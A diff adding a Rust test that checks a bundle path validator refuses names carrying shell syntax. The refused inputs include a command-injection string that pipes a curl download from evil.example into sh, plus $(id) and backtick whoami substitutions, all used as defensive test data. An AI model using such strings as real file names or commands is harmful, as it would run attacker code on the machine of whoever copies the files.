@@ -90,6 +90,31 @@ fn a_bundled_path_cannot_climb_out_or_become_a_flag() {
     }
 }
 
+/// The copy onto a computer goes through a shell, and a bundle is often a colleague's: a path
+/// that can close a quote or open a substitution is a command on the box of whoever invoked it.
+/// These were all accepted while nothing copied the files (#192).
+#[test]
+fn a_bundled_path_carries_no_shell_syntax() {
+    assert!(check_path("scripts/check.sh").is_ok());
+    assert!(check_path("Reference_2/v1.0-notes.md").is_ok());
+    for refused in [
+        "a';curl evil.example | sh;'",
+        "$(id).md",
+        "notes `whoami`.md",
+        "with space.md",
+        "semi;colon",
+        "pipe|d",
+        "star*.md",
+        "quote\"d",
+        "caf\u{e9}.md",
+    ] {
+        assert!(
+            check_path(refused).is_err(),
+            "{refused:?} should be refused"
+        );
+    }
+}
+
 /// Every refusal from a bundle carries the status it deserves: a traversal is not a request
 /// to send less data.
 #[test]
